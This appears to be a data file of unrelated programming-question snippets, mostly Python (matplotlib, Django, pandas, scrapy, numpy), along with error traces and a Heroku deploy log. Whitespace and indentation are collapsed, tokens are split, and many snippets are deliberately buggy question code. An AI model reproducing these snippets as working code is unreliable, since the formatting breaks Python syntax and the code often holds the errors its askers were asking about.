0.1 ) axis.plot ( x_data , y_data ) # Find a rectangle that does not collide with data . Start top-right # and work left , then try bottom-right and work left . inset_collides = False left_offsets = [ x / 10.0 for x in xrange ( 6 ) ] * 2 bottom_values = ( ( [ 1.0 - INSET_DEFAULT_HEIGHT - INSET_PADDING ] * ( len ( left_offsets ) / 2 ) ) + ( [ INSET_PADDING * 2 ] * ( len ( left_offsets ) / 2 ) ) ) for left_offset , bottom in zip ( left_offsets , bottom_values ) : # rect : ( left , bottom , width , height ) rect = ( 1.0 - INSET_DEFAULT_WIDTH - left_offset - INSET_PADDING , bottom , INSET_DEFAULT_WIDTH , INSET_DEFAULT_HEIGHT ) inset_collides = collide_rect ( rect , fig , axis , y_data ) print 'TRYING : ' , rect , 'RESULT : ' , inset_collides if not inset_collides : break if not inset_collides : inset = add_inset_to_axis ( fig , axis , rect ) inset.set_ylim ( axis.get_ylim ( ) ) inset.set_yticks ( [ y_min , y_min + ( ( y_max - y_min ) / 2.0 ) , y_max ] ) inset.xaxis.set_tick_params ( labelsize=INSET_TICK_FONTSIZE ) inset.yaxis.set_tick_params ( labelsize=INSET_TICK_FONTSIZE ) inset_xlimit = ( 0 , int ( len ( y_data ) / 100.0 * 2.5 ) ) # First 2.5 % of data . inset.set_xlim ( inset_xlimit [ 0 ] , inset_xlimit [ 1 ] , auto=False ) inset.plot ( x_data [ inset_xlimit [ 0 ] : inset_xlimit [ 1 ] + 1 ] , y_data [ inset_xlimit [ 0 ] : inset_xlimit [ 1 ] + 1 ] ) fig.savefig ( 'so_example.png ' ) TRYING : ( 0.6 , 0.7 , 0.35 , 0.25 ) RESULT : TrueTRYING : ( 0.5 , 0.7 , 0.35 , 0.25 ) RESULT : TrueTRYING : ( 0.4 , 0.7 , 0.35 , 0.25 ) RESULT : TrueTRYING : ( 0.30000000000000004 , 0.7 , 0.35 , 0.25 ) RESULT : TrueTRYING : ( 0.2 , 0.7 , 0.35 , 0.25 ) RESULT : TrueTRYING : ( 0.10000000000000002 , 0.7 , 0.35 , 0.25 ) RESULT : False"
"... # initial importssetup ( setup_requires= [ 'cython ' ] ) from Cython.Build import cythonizebar = Extension ( 'foo.bar ' , sources = [ 'bar.pyx ' ] ) setup ( name = 'foo ' , ... # parameters ext_modules = cythonize ( [ bar ] ) , ... # more parameters )"
"itertools.product ( [ 1 , 2 , 3 ] , [ 1 , 2 ] ) ( 1 , 2 ) itertools.product ( foo = [ 1 , 2 , 3 ] , bar = [ 1 , 2 ] ) output [ 'foo ' ] = 1output [ 'bar ' ] = 2 output.foo = 1output.bar = 2"
"from typing import Listimport weakrefclass MyObject : def __init ( self , foo ) self.foo = fooo1 = MyObject ( 1 ) o2 = MyObject ( 2 ) my_list : List [ weakref ] = [ weakref.ref ( o1 ) , weakref.ref ( o2 ) ] my_list : List [ Weakref [ MyObject ] ] = [ weakref.ref ( o1 ) , weakref.ref ( o2 ) ]"
"None = `` bad '' > > > import __builtin__ > > > __builtin__.None is NoneTrue > > > None > > > None = `` bad '' File `` < stdin > '' , line 1SyntaxError : assignment to None > > > __builtin__.None = `` bad '' File `` < stdin > '' , line 1SyntaxError : assignment to None > > > setattr ( __builtin__ , `` None '' , `` bad '' ) > > > __builtin__.None'bad ' > > > None > > > __builtin__.None is NoneFalse > > > __builtin__.None = None File `` < stdin > '' , line 1SyntaxError : assignment to None > > > class Abc : ... def __init__ ( self ) : ... self.None = None ... File `` < stdin > '' , line 3SyntaxError : assignment to None > > > class Abc : ... def __init__ ( self ) : ... setattr ( self , 'None ' , None ) ... > > >"
Rectangle { width : 300 height : 200 Text { x : 12 y : 34 color : red } }
"fl = StopWordsRemover ( inputCol= '' words '' , outputCol= '' filtered '' ) df = fl.transform ( df ) cv = CountVectorizer ( inputCol= '' filtered '' , outputCol= '' rawFeatures '' ) model = cv.fit ( df ) print ( model.vocabulary ) rm_stop_words = StopWordsRemover ( inputCol= '' words '' , outputCol= '' filtered '' ) count_freq = CountVectorizer ( inputCol=rm_stop_words.getOutputCol ( ) , outputCol= '' rawFeatures '' ) pipeline = Pipeline ( stages= [ rm_stop_words , count_freq ] ) model = pipeline.fit ( dfm ) df = model.transform ( dfm ) print ( model.vocabulary ) # This wo n't work as it 's not CountVectorizerModel print ( len ( model.vocabulary ) )"
"class GeneralSpider ( CrawlSpider ) : name = 'domain ' allowed_domains = [ 'domain.org ' ] start_urls = [ 'http : //www.domain.org/home ' ] def parse ( self , response ) : links = LinksItem ( ) links [ 'content ' ] = response.xpath ( `` //div [ @ id='h45F23 ' ] '' ) .extract ( ) return links class GeneralSpider ( CrawlSpider ) : name = 'domain ' allowed_domains = [ 'domain.org ' ] f = open ( `` urls.txt '' ) start_urls = [ url.strip ( ) for url in f.readlines ( ) ] # Each URL in the file has pagination if it has more than 30 elements # I do n't know how to paginate over each URL f.close ( ) def parse ( self , response ) : item = ShopItem ( ) item [ 'name ' ] = response.xpath ( `` //h1 [ @ id='u_name ' ] '' ) .extract ( ) item [ 'description ' ] = response.xpath ( `` //h3 [ @ id='desc_item ' ] '' ) .extract ( ) item [ 'prize ' ] = response.xpath ( `` //div [ @ id='price_eur ' ] '' ) .extract ( ) return item"
"test = pd.DataFrame ( [ 2,2,2,1,1,1,2,2,2,3,2,2,1,1 ] , index=pd.date_range ( '00:00 ' , freq='1h ' , periods=14 ) ) state1 = test.mask ( test ! =1 )"
"atomic blocks can be nested . In this case , when an inner block completes successfully , its effects can still be rolled back if an exception is raised in the outer block at a later point . @ transaction.atomicdef A ( ) : # # something B ( ) C ( ) # # something @ transaction.atomicdef B ( ) : # # something @ transaction.atomicdef C ( ) : # # something @ transaction.atomicdef A ( ) : B ( ) C ( ) def B ( ) : # # somethingdef C ( ) : # # something"
"class MyModel1 ( CachingMixin , MPTTModel ) : name = models.CharField ( null=False , blank=False , max_length=255 ) objects = CachingManager ( ) def __str__ ( self ) : return `` ; `` .join ( [ `` ID : % s '' % self.pk , `` name : % s '' % self.name , ] ) class MyModel2 ( CachingMixin , models.Model ) : name = models.CharField ( null=False , blank=False , max_length=255 ) model1 = models.ManyToManyField ( MyModel1 , related_name= '' MyModel2_MyModel1 '' ) objects = CachingManager ( ) def __str__ ( self ) : return `` ; `` .join ( [ `` ID : % s '' % self.pk , `` name : % s '' % self.name , ] ) > > > m1 = MyModel1.objects.all ( ) [ 0 ] > > > m2 = MyModel2.objects.all ( ) [ 0 ] > > > m2.model1.all ( ) [ ] > > > m2.model1.add ( m1 ) > > > m2.model1.all ( ) [ ]"
Test Parameter ValueX1 0 0.033285423511615113X1 1 0.78790279861666179X1 2 0.79136989638378297X1 3 0.80063190842016707X1 4 0.7884653622402551X1 5 0.78561849214309198 ... ... X1 22 22 : 0.82241991278171311 ... ... X2 ... myDF.groupby ( `` Test '' ) .Something
"gray = load_image ( IMG_FILE ) # image filegray = 255* ( gray < 128 ) .astype ( np.uint8 ) coords = cv2.findNonZero ( gray ) # Find all non-zero points ( text ) x , y , w , h = cv2.boundingRect ( coords ) # Find minimum spanning bounding boxrect = load_image ( IMG_FILE ) [ y : y+h , x : x+w ] # Crop the image - note we do this on the original image"
START = object ( ) END = object ( ) class START ( object ) : passclass END ( object ) : pass
def readfits ( filename ) : with fits.open ( filename ) as ft : # the fits contain a single HDU data = ft [ 0 ] .data return datadata_sci = [ ] for i in range ( 2000 ) : data_sci.append ( readfits ( `` filename_ { } .fits '' .format ( i ) ) ) def readfits ( filename ) : ft = fits.open ( filename ) as ft : data = ft [ 0 ] .data ft.close ( ) return data
"column1 column2 column3var1 var11 [ 1 , 2 , 3 , 4 ] var2 var22 [ 1 , 2 , 3 , 4 , -2 , 12 ] var3 var33 [ 1 , 2 , 3 , 4 , 33 , 544 ] column1 column2 column3var1 var11 1var1 var11 2var1 var11 3var1 var11 4var2 var22 1var2 var22 2var2 var22 3var2 var22 4var2 var22 -2 ... ... var3 var33 544"
"git push heroku masterCounting objects : 7036 , done.Compressing objects : 100 % ( 3933/3933 ) , done.Writing objects : 100 % ( 7036/7036 ) , 10.97 MiB | 338.00 KiB/s , done.Total 7036 ( delta 2020 ) , reused 7021 ( delta 2014 ) remote : Compressing source files ... done.remote : Building source : remote : remote : -- -- - > Python app detectedremote : -- -- - > Installing python-3.6.2remote : -- -- - > Installing pipremote : -- -- - > Installing requirements with pipremote : Collecting aniso8601==1.2.1 ( from -r /tmp/build_3d7108e037a9a8803be5100bdc092768/requirements.txt ( line 1 ) ) remote : Downloading aniso8601-1.2.1.tar.gz ( 62kB ) remote : Collecting click==6.7 ( from -r /tmp/build_3d7108e037a9a8803be5100bdc092768/requirements.txt ( line 2 ) ) remote : Downloading click-6.7-py2.py3-none-any.whl ( 71kB ) remote : Collecting cycler==0.10.0 ( from -r /tmp/build_3d7108e037a9a8803be5100bdc092768/requirements.txt ( line 3 ) ) remote : Downloading cycler-0.10.0-py2.py3-none-any.whlremote : Collecting deap==1.0.2.post2 ( from -r remote : Collecting Flask==0.12.2 ( from -r /tmp/build_3d7108e037a9a8803be5100bdc092768/requirements.txt ( line 5 ) ) remote : Downloading Flask-0.12.2-py2.py3-none-any.whl ( 83kB ) remote : Collecting Flask-RESTful==0.3.6 ( from -r /tmp/build_3d7108e037a9a8803be5100bdc092768/requirements.txt ( line 6 ) ) remote : Downloading Flask_RESTful-0.3.6-py2.py3-none-any.whlremote : Collecting functools32==3.2.3.post2 ( from -r /tmp/build_3d7108e037a9a8803be5100bdc092768/requirements.txt ( line 7 ) ) remote : Downloading functools32-3.2.3-2.zipremote : Complete output from command python setup.py egg_info : remote : This backport is for Python 2.7 only.remote : remote : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- remote : Command `` python setup.py egg_info '' failed with error code 1 in /tmp/pip-build-l0v0636d/functools32/remote : ! Push rejected , failed to compile Python app.remote : remote : ! Push failedremote : Verifying deploy ... remote : remote : ! Push rejected to XXXXXXX ( servername by Heroku ) .remote : pip install -r requirements.txt"
"EMAIL_BACKEND = 'django.core.mail.backends.filebased.EmailBackend'EMAIL_FILE_PATH = '/code/mails/ ' LOGGING = { 'version ' : 1 , 'disable_existing_loggers ' : False , 'handlers ' : { 'file ' : { 'level ' : 'DEBUG ' , 'class ' : 'logging.FileHandler ' , 'filename ' : '/code/logs/debug.log ' , } , } , 'loggers ' : { 'django ' : { 'handlers ' : [ 'file ' ] , 'level ' : 'DEBUG ' , 'propagate ' : True , } , } , }"
"from PIL import Image , ... def image_resize ( path , dcinput , file ) : dcfake = read_config ( configlocation ) [ `` resize '' ] [ `` dcfake '' ] try : imagehandler = Image.open ( path+file ) imagehandler = imagehandler.resize ( ( 2496 , 3495 ) , Image.ANTIALIAS ) imagehandler.save ( dcinput+file , optimize=True , quality=95 ) except Exception : imagehandler = Image.open ( path+file ) for i , page in enumerate ( ImageSequence.Iterator ( imagehandler ) ) : page = page.resize ( ( 2496 , 3495 ) , Image.ANTIALIAS ) page.save ( dcinput + `` proces % i.tif '' % i , optimize=True , quality=95 , save_all=True )"
"class Student ( object ) : def __init__ ( self , name , a , b , c ) : self.name = name self.a = a self.b = b self.c = c def average ( self ) : return ( a+b+c ) / 3.0 if __name__ == `` __main__ '' : a = Student ( `` Oscar '' , 10 , 10 , 10 )"
from yahoo_finance import Sharefrom time import sleepwhile True : stock = Share ( 'XLV ' ) prevClose = float ( stock.get_prev_close ( ) ) print prevClose sleep ( 1 )
"from Tkinter import *root = Tk ( ) text = Text ( root , width = 12 , height = 5 , wrap = WORD ) text.insert ( END , 'This is an example text . ' ) text.pack ( ) root.mainloop ( ) int ( text_widget.index ( 'end-1c ' ) .split ( ' . ' ) [ 0 ] )"
"lst = [ 'foo ' , 'bar ' , ' ! test ' , 'hello ' , 'world ! ' , 'word ' ] lst = [ 'foo ' , 'bar ' , [ 'test ' , 'hello ' , 'world ' ] , 'word ' ] def define ( lst ) : for index , item in enumerate ( lst ) : if item [ 0 ] == ' ! ' and lst [ index+2 ] [ -1 ] == ' ! ' : temp = lst [ index : index+3 ] del lst [ index+1 : index+2 ] lst [ index ] = temp return lst"
"with open ( r '' file.txt '' , '' r '' ) as f : for line in f : line = unicode ( line , 'utf-8 ' ) the_text = line.split ( '\t ' ) [ 1 ] the_text.replace ( u'\u05C3 ' , '' )"
"Point : :Enum x , y constructor ( x , y ) { ... } bottom_left = Point ( 0 , 0 ) top_left = Point ( 0 , 100 ) top_right = Point ( 100 , 100 ) bottom_right = Point ( 100 , 0 )"
"def GetData ( id ) : TheConnection = SqlClient.SqlConnection ( `` server=MyServer ; database=MyDB ; Trusted_Connection=yes '' ) TheConnection.Open ( ) sqlcommand = `` MyStoredProcedure # GetMyData ' % s ' '' % id MyAction = SqlClient.SqlCommand ( sqlcommand , TheConnection ) MyReader = MyAction.ExecuteReader ( ) results = list ( ) while MyReader.Read ( ) : row = { 'Type ' : 'LolCat ' , 'Date ' : datetime.datetime ( MyReader [ 1 ] ) , 'Location ' : str ( MyReader [ 3 ] ) , 'Weight ' : float ( MyReader [ 6 ] ) /float ( MyReader [ 7 ] ) , } results.append ( row ) TheConnection.Close ( ) MyReader.Close ( ) return resultsresults1 = GetData ( 1234 ) results2 = GetData ( 2345 ) ... picklefile= open ( `` testpickle '' , '' w '' ) cPickle.dump ( ( results1 , results2 ) , picklefile ) ... picklefile = open ( `` testpickle '' , '' r '' ) p = cPickle.load ( file ) # this is the line that gives the error `` ImportError : No module named clr ''"
for I in range ( values ) : value_per_unit.append ( values [ I ] /weights [ I ] ) value_per_unit.sort ( ) weights [ ( value_per_unit_sorted.index ( max ( value_per_unit_sorted ) ) ) ]
"engine = create_engine ( settings.sql_engine , echo=True , pool_recycle=1 ) # module db.py : from sqlalchemy.ext.declarative import declarative_base , declared_attrfrom sqlalchemy import *from sqlalchemy.orm import sessionmaker , relationship , backreffrom sqlalchemy.orm.exc import *Base = declarative_base ( ) class Drive ( Base ) : __tablename__ = `` drives '' id = Column ( Integer , primary_key=True ) isPhysical = Column ( Boolean ) devicePath = Column ( String ( 100 ) ) name = Column ( String ( 10 ) ) encrypted = Column ( Boolean , default=False ) size = Column ( BigInteger ) def __init__ ( self ) : pass sql_engine = 'mssql+pyodbc : //Tester : Password @ sql-server/Automation'engine = create_engine ( sql_engine , echo=True ) Session = sessionmaker ( bind=engine ) Base.metadata.create_all ( engine ) # hibernation.pyfrom db import *import subprocesscommand = r '' pwrtest /sleep /s:4 /h : n /c:1 '' out = subprocess.check_output ( command ) # hibernation occurssession = Session ( ) session.query ( Drive ) .all ( )"
"import timeitimport sysdicts = { } print `` \n***Building dict ... '' start = timeit.default_timer ( ) for j in range ( 0,5 ) : for i in range ( 0,1000000 ) : dicts [ `` +str ( j ) +str ( i ) ] = i print str ( i ) + '- ' + str ( j ) print `` Size : `` , sys.getsizeof ( dicts ) /1024/1024 , `` MB '' print `` Total time of build dict '' , timeit.default_timer ( ) - start"
"import disdis.dis ( `` i in ( 2 , 3 ) '' ) import disdis.dis ( `` i in [ 2 , 3 ] '' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/lib/python2.7/dis.py '' , line 45 , in dis disassemble_string ( x ) File `` /usr/lib/python2.7/dis.py '' , line 112 , in disassemble_string labels = findlabels ( code ) File `` /usr/lib/python2.7/dis.py '' , line 166 , in findlabels oparg = ord ( code [ i ] ) + ord ( code [ i+1 ] ) *256IndexError : string index out of range"
"from mpl_toolkits.mplot3d import Axes3Dfrom matplotlib.collections import PolyCollectionfrom matplotlib.colors import colorConverterimport matplotlib.pyplot as pltimport numpy as npfig = plt.figure ( ) ax = fig.gca ( projection='3d ' ) cc = lambda arg : colorConverter.to_rgba ( arg , alpha=0.6 ) xs = np.arange ( 5 , 10 , 0.4 ) verts = [ ] zs = [ 0.0 , 1.0 , 2.0 , 3.0 ] for z in zs : ys = np.random.rand ( len ( xs ) ) ys [ 0 ] , ys [ -1 ] = 0.1 , 0 verts.append ( list ( zip ( xs , ys ) ) ) poly = PolyCollection ( verts , facecolors = [ cc ( ' r ' ) , cc ( ' g ' ) , cc ( ' b ' ) , cc ( ' y ' ) ] ) poly.set_alpha ( 0.7 ) ax.add_collection3d ( poly , zs=zs , zdir= ' y ' ) ax.set_xlabel ( ' X ' ) ax.set_xlim3d ( 0 , 10 ) ax.set_ylabel ( ' Y ' ) ax.set_ylim3d ( -1 , 4 ) ax.set_zlabel ( ' Z ' ) ax.set_zlim3d ( 0 , 1 ) plt.show ( )"
"self.vpan = gtk.VPaned ( ) self.hpan = gtk.HPaned ( ) self.vpan.show ( ) self.hpan.show ( ) self.vBox1.pack_end ( self.hpan , True , True , 0 ) self.hpan.pack2 ( self.vpan , True , True ) self.ftree = gtk.TreeStore ( str , str , str ) self.treefill ( None , os.path.abspath ( os.path.dirname ( __file__ ) ) ) self.tree = gtk.TreeView ( self.ftree ) self.tvcolumn = gtk.TreeViewColumn ( 'Project ' ) self.tree.append_column ( self.tvcolumn ) self.cellpb = gtk.CellRendererPixbuf ( ) self.celltxt = gtk.CellRendererText ( ) self.tvcolumn.pack_start ( self.cellpb , False ) self.tvcolumn.pack_start ( self.celltxt , True ) self.tvcolumn.set_attributes ( self.cellpb , stock_id=0 ) self.tvcolumn.set_attributes ( self.celltxt , text=1 ) self.tvcolumn.set_resizable ( True ) self.hpan.pack1 ( self.tree , True , True ) self.tree.show ( )"
"class Comment ( MPTTModel ) : comment = models.CharField ( max_length=1023 ) resource = models.ForeignKey ( 'Resource ' ) created_at = models.DateTimeField ( auto_now_add=True ) parent = TreeForeignKey ( 'self ' , null=True , blank=True , related_name='children ' ) author = models.ForeignKey ( User ) class MPTTMeta : order_insertion_by = [ 'created_at ' ] ValueError at /admin/app/comment/add/ Can not use None as a query value"
my_string = `` abcdef '' my_interval = 1:3print ( my_string [ my_interval ] )
"response = [ ] while True : recv = s.recv ( 1024 ) if not recv : break response.append ( recv ) s.close ( ) response = `` .join ( response ) return flask.make_response ( response , 200 , { 'Content-type ' : 'binary/octet-stream ' , 'Content-length ' : len ( response ) , 'Content-transfer-encoding ' : 'binary ' , } )"
"a= [ [ 1,2,3,4 ] , [ 2,3,4,5 ] , [ 3,4,5,6,7 ] ] , b= [ [ 5,6,7,8 ] , [ 9,1,2,3 ] , [ 4,5,6,7,8 ] ] a-b= [ [ -4 , -4 , -4 , -4 ] , [ 7,2,2,2 ] , [ -1 , -1 , -1 , -1 , -1 ] ] np.array ( a ) -np.array ( b )"
"Array = np.zeros ( ( 2 , 10 , 10 ) ) indexes = np.array ( [ 0,0,0 ] ) Array [ indexes ] = 5"
"> > > l = [ [ 1,2,3 ] , [ 4,5,6 ] , [ 7,8,9 ] ] > > > sum ( l , [ ] ) [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ] import itertools , timeitprint ( timeit.timeit ( `` sum ( l , [ ] ) '' , setup= ' l = [ [ 1,2,3 ] , [ 4,5,6 ] , [ 7,8,9 ] ] ' ) ) print ( timeit.timeit ( `` list ( itertools.chain.from_iterable ( l ) ) '' , setup= ' l = [ [ 1,2,3 ] , [ 4,5,6 ] , [ 7,8,9 ] ] ' ) ) 0.71555228360702460.9883352857722025 s = ' l = [ [ 4,5,6 ] for _ in range ( 20 ) ] 'print ( timeit.timeit ( `` sum ( l , [ ] ) '' , setup=s ) ) print ( timeit.timeit ( `` list ( itertools.chain.from_iterable ( l ) ) '' , setup=s ) ) 6.4798978107025373.793455760814343"
"xdata = [ 85,86,87,88,89,90,91,91.75,93,96,100,101,102,103,104,105,106,107.25,108.25,109,109.75,111,112,112.75,114,115.25,116,116.75,118,119.25,120,121,122,122.5,123.5,125.25,126,126.75,127.75,129.25,130.25,131,131.75,133,134.25,135,136,137,138,139,140,141,142,143,144,144.75,146,146.75,148,149.25,150,150.5,152,153.25,154,155,156.75,158,159,159.75,161,162,162.5,164,165,166 ] ydata = [ 0.2,0.21,0.18,0.21,0.19,0.2,0.21,0.2,0.18,0.204,0.208,0.2,0.21,0.25,0.2,0.19,0.216,0.22,0.224,0.26,0.229,0.237,0.22,0.246,0.25,0.264,0.29,0.274,0.29,0.3,0.27,0.32,0.38,0.348,0.372,0.398,0.35,0.42,0.444,0.48,0.496,0.55,0.51,0.54,0.57,0.51,0.605,0.57,0.65,0.642,0.6,0.66,0.7,0.688,0.69,0.705,0.67,0.717,0.69,0.728,0.75,0.736,0.73,0.744,0.72,0.76,0.752,0.74,0.76,0.7546,0.77,0.74,0.758,0.74,0.78,0.76 ] def f ( xdata , m1 , m2 , m3 , m4 ) : if m1 > 0.05 and m1 < 0.3 and \ m2 > 0.3 and m2 < 0.8 and \ m3 > 0.05 and m3 < 0.5 and \ m4 > 100 and m4 < 200 : return m1 + ( m2 * 1 . / ( 1 + e ** ( -m3 * ( x - m4 ) ) ) ) return ( abs ( m1 ) + abs ( m2 ) + abs ( m3 ) + abs ( m4 ) ) * 1e14 # some large number import numpy as npfrom scipy.optimize import curve_fitfrom math import exdata = np.array ( [ 85,86,87,88,89,90,91,91.75,93,96,100,101,102,103,104,105,106,107.25,108.25,109,109.75,111,112,112.75,114,115.25,116,116.75,118,119.25,120,121,122,122.5,123.5,125.25,126,126.75,127.75,129.25,130.25,131,131.75,133,134.25,135,136,137,138,139,140,141,142,143,144,144.75,146,146.75,148,149.25,150,150.5,152,153.25,154,155,156.75,158,159,159.75,161,162,162.5,164,165,166 ] ) ` ydata = np.array ( [ 0.2,0.21,0.18,0.21,0.19,0.2,0.21,0.2,0.18,0.204,0.208,0.2,0.21,0.25,0.2,0.19,0.216,0.22,0.224,0.26,0.229,0.237,0.22,0.246,0.25,0.264,0.29,0.274,0.29,0.3,0.27,0.32,0.38,0.348,0.372,0.398,0.35,0.42,0.444,0.48,0.496,0.55,0.51,0.54,0.57,0.51,0.605,0.57,0.65,0.642,0.6,0.66,0.7,0.688,0.69,0.705,0.67,0.717,0.69,0.728,0.75,0.736,0.73,0.744,0.72,0.76,0.752,0.74,0.76,0.7546,0.77,0.74,0.758,0.74,0.78,0.76 ] ) def f ( xdata , m1 , m2 , m3 , m4 ) : if m1 > 0.05 and m1 < 0.3 and \ m2 > 0.3 and m2 < 0.8 and \ m3 > 0.05 and m3 < 0.5 and \ m4 > 100 and m4 < 200 : return m1 + ( m2 * 1 . / ( 1 + e ** ( -m3 * ( x - m4 ) ) ) ) return ( abs ( m1 ) + abs ( m2 ) + abs ( m3 ) + abs ( m4 ) ) * 1e14print curve_fit ( f , xdata , ydata )"
*** KeyError : `` The model 'mymodelname ' from the app 'otherappname ' is not available in this migration . ''
import abcclass MyABC ( abc.ABC ) : @ abstractmethod def foo ( self ) : passMyConcreteSubclass ( MyABC ) : pass > > > MyConcreteSubclass ( ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TypeError Traceback ( most recent call last ) < ipython-input-39-fbfc0708afa6 > in < module > ( ) -- -- > 1 t = MySubclass ( ) TypeError : Ca n't instantiate abstract class MySubclass with abstract methods foo class MyConcreteSubclass ( MyABC ) : def foo ( self ) : print ( `` bar '' ) MyConcreteSubclass.foo -- > < function __main__.MyConcreteSubclass.foo ( self ) > > > > t = MyConcreteSubclass ( ) > > > t.foo ( ) bar > > > del MyConcreteSubclass.foo > > > MyConcreteSubclass.foo < function __main__.MyABC.foo ( self ) > > > > t = MyConcreteSubclass ( ) > > > print ( t.foo ( ) ) None
"import os , shutil , stat , timewith open ( 'test.txt ' , ' w ' ) as f : pass # create an arbitrary fileshutil.copy ( 'test.txt ' , 'test2.txt ' ) # copy itshutil.copystat ( 'test.txt ' , 'test2.txt ' ) # copy its stats , toot1 = os.lstat ( 'test.txt ' ) .st_mtime # get the time of last modification for both filest2 = os.lstat ( 'test2.txt ' ) .st_mtimeprint t1 # prints something like : 1371123658.54print t2 # prints the same string , as expected : 1371123658.54print t1 == t2 # prints False ! Why ? ! print ( `` % .7f '' % t1 ) # prints e.g . 1371126279.1365688print ( `` % .7f '' % t2 ) # prints e.g . 1371126279.1365681"
"import subprocesssubprocess.call ( [ 'cmd ' , 'D : \SteamR\steamapps\common\Stardew Valley\Stardew Valley.exe ' ] )"
"import scrapyfrom ..items import NameItemclass LoginSpider ( scrapy.Spider ) : name = `` LoginSpider '' start_urls = [ `` http : //www.starcitygames.com/buylist/ '' ] def parse ( self , response ) : return scrapy.FormRequest.from_response ( response , formcss= ' # existing_users form ' , formdata= { 'ex_usr_email ' : 'abc @ example.com ' , 'ex_usr_pass ' : 'password ' } , callback=self.after_login ) def after_login ( self , response ) : item = NameItem ( ) display_button = response.xpath ( '//a [ contains ( . , `` Display > > '' ) ] / @ href ' ) .get ( ) yield response.follow ( display_button , self.parse ) item [ `` Name '' ] = response.css ( `` div.bl-result-title : :text '' ) .get ( ) return item"
A B C12 true 112 true 13 nan 23 nan 3 A B C12 true 13 nan 23 nan 3
"File `` /home/deploy/.virtualenvs/bapp/lib/python2.7/site-packages/requests/sessions.py '' , line 295 , in post return self.request ( 'post ' , url , data=data , **kwargs ) File `` /home/deploy/.virtualenvs/bapp/lib/python2.7/site-packages/requests/sessions.py '' , line 252 , in request r.send ( prefetch=prefetch ) File `` /home/deploy/.virtualenvs/bapp/lib/python2.7/site-packages/requests/models.py '' , line 625 , in send raise ConnectionError ( sockerr ) ConnectionError : [ Errno 66 ] unknown File `` /home/deploy/.virtualenvs/bapp/lib/python2.7/site-packages/requests/packages/urllib3/connectionpool.py '' , line 94 , in connect sock = socket.create_connection ( ( self.host , self.port ) , self.timeout ) File `` /home/deploy/.virtualenvs/bapp/lib/python2.7/site-packages/gevent/socket.py '' , line 637 , in create_connection for res in getaddrinfo ( host , port , 0 , SOCK_STREAM ) : File `` /home/deploy/.virtualenvs/bapp/lib/python2.7/site-packages/gevent/socket.py '' , line 769 , in getaddrinfo raiseDNSError : [ Errno 66 ] unknown [ me @ host : ~ ] $ cat /etc/resolv.conf ; generated by /sbin/dhclient-scriptnameserver 10.3.0.2"
tput : unknown terminal `` emacs ''
"print dset1 Store Date PromoInterval1760 2 2013-05-04 Jan , Apr , Jul , Oct1761 2 2013-05-03 Jan , Apr , Jul , Oct1762 2 2013-05-02 Jan , Apr , Jul , Oct1763 2 2013-05-01 Jan , Apr , Jul , Oct1764 2 2013-04-30 Jan , Apr , Jul , Octdef func ( a , b ) : y = b.split ( `` , '' ) z = { 1 : 'Jan',2 : 'Feb',3 : 'Mar ' , 4 : 'Apr',5 : 'May',6 : 'Jun',7 : 'Jul',8 : 'Aug',9 : 'Sep ' , 10 : 'Oct',11 : 'Nov',12 : 'Dec ' } return ( z [ a ] in y ) dset1.apply ( func , axis=1 , args = ( dset1 [ 'Date ' ] .dt.month , dset1 [ 'PromoInterval ' ] ) ) { 'Date ' : { 1760 : Timestamp ( '2013-05-04 00:00:00 ' ) , 1761 : Timestamp ( '2013-05-03 00:00:00 ' ) , 1762 : Timestamp ( '2013-05-02 00:00:00 ' ) , 1763 : Timestamp ( '2013-05-01 00:00:00 ' ) , 1764 : Timestamp ( '2013-04-30 00:00:00 ' ) } , 'PromoInterval ' : { 1760 : 'Jan , Apr , Jul , Oct ' , 1761 : 'Jan , Apr , Jul , Oct ' , 1762 : 'Jan , Apr , Jul , Oct ' , 1763 : 'Jan , Apr , Jul , Oct ' , 1764 : 'Jan , Apr , Jul , Oct ' } , 'Store ' : { 1760 : 2 , 1761 : 2 , 1762 : 2 , 1763 : 2 , 1764 : 2 } }"
"> > > maskamasked_array ( data = [ -- 1 3 2 1 -- -- 3 6 ] , mask = [ True False False False False True True False False ] , fill_value = 0 ) > > > bmasked_array ( data = [ -- 1 3 2 ] , mask = [ True False False False ] , fill_value = 0 ) > > > np.append ( maska , b ) masked_array ( data = [ 0 1 3 2 1 0 0 3 6 0 1 3 2 ] , mask = False , fill_value = 999999 )"
"from django.contrib import messagesfrom django.contrib.auth import authenticate , login , logoutfrom django.contrib.auth.forms import AuthenticationForm , UserCreationFormfrom django.core.urlresolvers import reversefrom django.http import HttpResponseRedirect , HttpResponsefrom django.shortcuts import renderfrom .models import Profilefrom .forms import ProfileForm , PasswordFormdef sign_in ( request ) : form = AuthenticationForm ( ) if request.method == 'POST ' : form = AuthenticationForm ( data=request.POST ) if form.is_valid ( ) : if form.user_cache is not None : user = form.user_cache if user.is_active : login ( request , user ) return HttpResponseRedirect ( reverse ( 'home ' ) # TODO : go to profile ) else : messages.error ( request , `` That user account has been disabled . '' ) else : messages.error ( request , `` Username or password is incorrect . '' ) return render ( request , 'accounts/sign_in.html ' , { 'form ' : form } ) def sign_up ( request ) : form = UserCreationForm ( ) if request.method == 'POST ' : form = UserCreationForm ( data=request.POST ) if form.is_valid ( ) : form.save ( ) user = authenticate ( username=form.cleaned_data [ 'username ' ] , password=form.cleaned_data [ 'password1 ' ] ) new_profile = Profile.objects.create ( user=user ) login ( request , user ) messages.success ( request , `` You 're now a user ! You 've been signed in , too . '' ) return HttpResponseRedirect ( reverse ( 'home ' ) ) # TODO : go to profile return render ( request , 'accounts/sign_up.html ' , { 'form ' : form } ) def sign_out ( request ) : logout ( request ) messages.success ( request , `` You 've been signed out . Come back soon ! '' ) return HttpResponseRedirect ( reverse ( 'home ' ) ) def profile ( request ) : user = request.user try : account = Profile.objects.get ( user=user ) except Profile.DoesNotExist : account = None print ( account.first_name ) context = { 'account ' : account } return render ( request , 'accounts/profile.html ' , context ) def edit ( request ) : account = Profile.objects.get ( user=request.user ) form = ProfileForm ( instance=account ) if request.method == 'POST ' : account = Profile.objects.get ( user=request.user ) form = ProfileForm ( request.POST , request.FILES ) if form.is_valid ( ) : account.first_name = form.cleaned_data [ 'first_name ' ] account.last_name = form.cleaned_data [ 'last_name ' ] account.email = form.cleaned_data [ 'email ' ] account.bio 